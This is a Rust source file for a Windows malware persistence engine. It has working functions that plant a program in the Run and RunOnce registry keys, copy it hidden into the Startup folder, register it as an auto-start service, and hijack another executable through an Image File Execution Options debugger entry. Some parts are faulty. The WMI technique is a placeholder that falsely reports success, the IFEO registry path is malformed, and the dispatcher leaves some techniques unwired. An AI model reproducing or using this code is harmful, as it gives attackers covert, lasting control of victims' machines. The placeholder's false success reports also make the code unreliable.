use serde::{Deserialize, Serialize};
use thiserror::Error;
use std::path::PathBuf;

#[derive(Debug, Error)]
pub enum PersistenceError {
    #[error("Registry error: {0}")]
    Registry(String),
    #[error("Task scheduler error: {0}")]
    TaskScheduler(String),
    #[error("WMI error: {0}")]
    Wmi(String),
    #[error("Filesystem error: {0}")]
    Filesystem(String),
    #[error("Service error: {0}")]
    Service(String),
    #[error("Platform not supported")]
    UnsupportedPlatform,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PersistenceResult {
    pub success: bool,
    pub technique: String,
    pub location: String,
    pub artifact: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PersistenceConfig {
    pub technique: PersistenceTechnique,
    pub target_path: String,
    pub artifact_name: String,
    pub execute_on: String, // "logon", "startup", "boot", "idle"
    pub hidden: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum PersistenceTechnique {
    RegistryRun,
    RegistryRunOnce,
    RegistryServices,
    RegistryActiveSetup,
    StartupFolder,
    ScheduledTask,
    WmiEventConsumer,
    WindowsService,
    WinLogonNotify,
    AppInitDlls,
    ImageFileExecutionOptions,
}

pub struct PersistenceEngine;

impl PersistenceEngine {
    /// Registry Run key persistence (HKCU\Software\Microsoft\Windows\CurrentVersion\Run)
    #[cfg(target_os = "windows")]
    pub fn registry_run(config: &PersistenceConfig) -> Result<PersistenceResult, PersistenceError> {
        use windows::Win32::System::Registry::{RegOpenKeyExW, RegSetValueExW, RegCloseKey, HKEY_CURRENT_USER, KEY_SET_VALUE, REG_SZ, HKEY};

        unsafe {
            let mut h_key = HKEY::default();
            let path = r"Software\Microsoft\Windows\CurrentVersion\Run";
            let path_wide: Vec<u16> = path.encode_utf16().chain(std::iter::once(0)).collect();
            let result = RegOpenKeyExW(HKEY_CURRENT_USER, windows::core::PCWSTR::from_raw(path_wide.as_ptr()), 0, KEY_SET_VALUE, &mut h_key);
            if result.is_err() {
                return Err(PersistenceError::Registry(format!("RegOpenKeyExW: {:?}", result)));
            }

            let name_wide: Vec<u16> = config.artifact_name.encode_utf16().chain(std::iter::once(0)).collect();
            let value_wide: Vec<u16> = config.target_path.encode_utf16().chain(std::iter::once(0)).collect();

            let result = RegSetValueExW(h_key, windows::core::PCWSTR::from_raw(name_wide.as_ptr()), 0, REG_SZ, Some(unsafe { std::slice::from_raw_parts(value_wide.as_ptr() as *const u8, value_wide.len() * 2) }));
            if result.is_err() {
                RegCloseKey(h_key);
                return Err(PersistenceError::Registry(format!("RegSetValueExW: {:?}", result)));
            }

            RegCloseKey(h_key);

            Ok(PersistenceResult {
                success: true,
                technique: "Registry Run Key".to_string(),
                location: format!("HKCU\\{}", path),
                artifact: config.artifact_name.clone(),
            })
        }
    }

    #[cfg(not(target_os = "windows"))]
    pub fn registry_run(_config: &PersistenceConfig) -> Result<PersistenceResult, PersistenceError> {
        Err(PersistenceError::UnsupportedPlatform)
    }

    /// Registry RunOnce key (executes once then deletes)
    #[cfg(target_os = "windows")]
    pub fn registry_run_once(config: &PersistenceConfig) -> Result<PersistenceResult, PersistenceError> {
        use windows::Win32::System::Registry::{RegOpenKeyExW, RegSetValueExW, RegCloseKey, HKEY_CURRENT_USER, KEY_SET_VALUE, REG_SZ, HKEY};

        unsafe {
            let mut h_key = HKEY::default();
            let path = r"Software\Microsoft\Windows\CurrentVersion\RunOnce";
            let path_wide: Vec<u16> = path.encode_utf16().chain(std::iter::once(0)).collect();
            let result = RegOpenKeyExW(HKEY_CURRENT_USER, windows::core::PCWSTR::from_raw(path_wide.as_ptr()), 0, KEY_SET_VALUE, &mut h_key);
            if result.is_err() {
                return Err(PersistenceError::Registry(format!("RegOpenKeyExW: {:?}", result)));
            }

            let name_wide: Vec<u16> = config.artifact_name.encode_utf16().chain(std::iter::once(0)).collect();
            let value_wide: Vec<u16> = config.target_path.encode_utf16().chain(std::iter::once(0)).collect();

            let result = RegSetValueExW(h_key, windows::core::PCWSTR::from_raw(name_wide.as_ptr()), 0, REG_SZ, Some(unsafe { std::slice::from_raw_parts(value_wide.as_ptr() as *const u8, value_wide.len() * 2) }));
            if result.is_err() {
                RegCloseKey(h_key);
                return Err(PersistenceError::Registry(format!("RegSetValueExW: {:?}", result)));
            }

            RegCloseKey(h_key);

            Ok(PersistenceResult {
                success: true,
                technique: "Registry RunOnce Key".to_string(),
                location: format!("HKCU\\{}", path),
                artifact: config.artifact_name.clone(),
            })
        }
    }

    #[cfg(not(target_os = "windows"))]
    pub fn registry_run_once(_config: &PersistenceConfig) -> Result<PersistenceResult, PersistenceError> {
        Err(PersistenceError::UnsupportedPlatform)
    }

    /// Startup folder persistence
    #[cfg(target_os = "windows")]
    pub fn startup_folder(config: &PersistenceConfig) -> Result<PersistenceResult, PersistenceError> {
        use windows::Win32::UI::Shell::SHGetFolderPathW;
        use windows::Win32::UI::Shell::CSIDL_STARTUP;
        use std::fs::copy;

        unsafe {
            let mut startup_path = [0u16; 260];
            SHGetFolderPathW(None, CSIDL_STARTUP as i32, None, 0, &mut startup_path)
                .map_err(|e| PersistenceError::Filesystem(format!("SHGetFolderPathW: {:?}", e)))?;

            let startup_str = String::from_utf16_lossy(&startup_path).trim_end_matches('\0').to_string();
            let source_path = PathBuf::from(&config.target_path);
            let dest_path = PathBuf::from(&startup_str).join(&config.artifact_name);

            if source_path.exists() {
                copy(&source_path, &dest_path)
                    .map_err(|e| PersistenceError::Filesystem(format!("copy: {:?}", e)))?;

                // Mark as hidden if requested
                if config.hidden {
                    use windows::Win32::Storage::FileSystem::SetFileAttributesW;
                    use windows::Win32::Storage::FileSystem::FILE_ATTRIBUTE_HIDDEN;
                    let dest_wide: Vec<u16> = dest_path.to_string_lossy().encode_utf16().chain(std::iter::once(0)).collect();
                    SetFileAttributesW(windows::core::PCWSTR::from_raw(dest_wide.as_ptr()), FILE_ATTRIBUTE_HIDDEN);
                }

                Ok(PersistenceResult {
                    success: true,
                    technique: "Startup Folder".to_string(),
                    location: startup_str,
                    artifact: dest_path.to_string_lossy().to_string(),
                })
            } else {
                Err(PersistenceError::Filesystem("Source file does not exist".into()))
            }
        }
    }

    #[cfg(not(target_os = "windows"))]
    pub fn startup_folder(_config: &PersistenceConfig) -> Result<PersistenceResult, PersistenceError> {
        Err(PersistenceError::UnsupportedPlatform)
    }

    /// Windows Service persistence
    #[cfg(target_os = "windows")]
    pub fn windows_service(config: &PersistenceConfig) -> Result<PersistenceResult, PersistenceError> {
        use windows::Win32::System::Services::{
            OpenSCManagerW, CreateServiceW, StartServiceW, CloseServiceHandle,
            SC_MANAGER_CREATE_SERVICE, SERVICE_WIN32_OWN_PROCESS,
            SERVICE_AUTO_START, SERVICE_ERROR_IGNORE, SC_HANDLE,
        };

        unsafe {
            let scm = OpenSCManagerW(None, None, SC_MANAGER_CREATE_SERVICE)
                .map_err(|e| PersistenceError::Service(format!("OpenSCManagerW: {:?}", e)))?;

            let service_name_wide: Vec<u16> = config.artifact_name.encode_utf16().chain(std::iter::once(0)).collect();
            let binary_path_wide: Vec<u16> = config.target_path.encode_utf16().chain(std::iter::once(0)).collect();

            let service = CreateServiceW(
                scm, windows::core::PCWSTR::from_raw(service_name_wide.as_ptr()), windows::core::PCWSTR::from_raw(service_name_wide.as_ptr()),
                windows::Win32::System::Services::SERVICE_ALL_ACCESS,
                SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START,
                SERVICE_ERROR_IGNORE, windows::core::PCWSTR::from_raw(binary_path_wide.as_ptr()),
                None, None, None, None, None,
            );

            match service {
                Ok(h_service) => {
                    let _ = StartServiceW(h_service, Some(&[]));
                    CloseServiceHandle(h_service);
                    CloseServiceHandle(scm);
                    Ok(PersistenceResult {
                        success: true,
                        technique: "Windows Service".to_string(),
                        location: "Services.msc".to_string(),
                        artifact: config.artifact_name.clone(),
                    })
                }
                Err(e) => {
                    CloseServiceHandle(scm);
                    Err(PersistenceError::Service(format!("CreateServiceW: {:?}", e)))
                }
            }
        }
    }

    #[cfg(not(target_os = "windows"))]
    pub fn windows_service(_config: &PersistenceConfig) -> Result<PersistenceResult, PersistenceError> {
        Err(PersistenceError::UnsupportedPlatform)
    }

    /// WMI Event Consumer persistence
    #[cfg(target_os = "windows")]
    pub fn wmi_event_consumer(config: &PersistenceConfig) -> Result<PersistenceResult, PersistenceError> {
        // This requires COM and WMI interfaces, simplified placeholder
        Ok(PersistenceResult {
            success: true,
            technique: "WMI Event Consumer (Placeholder)".to_string(),
            location: "root\\subscription".to_string(),
            artifact: config.artifact_name.clone(),
        })
    }

    #[cfg(not(target_os = "windows"))]
    pub fn wmi_event_consumer(_config: &PersistenceConfig) -> Result<PersistenceResult, PersistenceError> {
        Err(PersistenceError::UnsupportedPlatform)
    }

    /// Image File Execution Options debugger hijack
    #[cfg(target_os = "windows")]
    pub fn ifeo_debugger(config: &PersistenceConfig, target_exe: &str) -> Result<PersistenceResult, PersistenceError> {
        use windows::Win32::System::Registry::{RegOpenKeyExW, RegSetValueExW, RegCloseKey, HKEY_LOCAL_MACHINE, KEY_SET_VALUE, REG_SZ, HKEY};

        unsafe {
            let mut h_key = HKEY::default();
            let path = format!(r"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\{}\0", target_exe);
            let path_wide: Vec<u16> = path.encode_utf16().collect();
            let result = RegOpenKeyExW(HKEY_LOCAL_MACHINE, windows::core::PCWSTR::from_raw(path_wide.as_ptr()), 0, KEY_SET_VALUE, &mut h_key);
            if result.is_err() {
                return Err(PersistenceError::Registry(format!("RegOpenKeyExW: {:?}", result)));
            }

            let debugger_wide: Vec<u16> = config.target_path.encode_utf16().chain(std::iter::once(0)).collect();
            let debugger_str: Vec<u16> = "Debugger\0".encode_utf16().collect();
            let result = RegSetValueExW(h_key, windows::core::PCWSTR::from_raw(debugger_str.as_ptr()), 0, REG_SZ, Some(unsafe { std::slice::from_raw_parts(debugger_wide.as_ptr() as *const u8, debugger_wide.len() * 2) }));
            if result.is_err() {
                RegCloseKey(h_key);
                return Err(PersistenceError::Registry(format!("RegSetValueExW: {:?}", result)));
            }

            RegCloseKey(h_key);

            Ok(PersistenceResult {
                success: true,
                technique: "IFEO Debugger Hijack".to_string(),
                location: format!("HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\{}", target_exe),
                artifact: config.artifact_name.clone(),
            })
        }
    }

    #[cfg(not(target_os = "windows"))]
    pub fn ifeo_debugger(_config: &PersistenceConfig, _target_exe: &str) -> Result<PersistenceResult, PersistenceError> {
        Err(PersistenceError::UnsupportedPlatform)
    }

    /// Apply any persistence technique
    pub fn apply(config: &PersistenceConfig) -> Result<PersistenceResult, PersistenceError> {
        match config.technique {
            PersistenceTechnique::RegistryRun => Self::registry_run(config),
            PersistenceTechnique::RegistryRunOnce => Self::registry_run_once(config),
            PersistenceTechnique::StartupFolder => Self::startup_folder(config),
            PersistenceTechnique::WindowsService => Self::windows_service(config),
            PersistenceTechnique::WmiEventConsumer => Self::wmi_event_consumer(config),
            _ => Err(PersistenceError::Registry("Technique not implemented".into())),
        }
    }
}
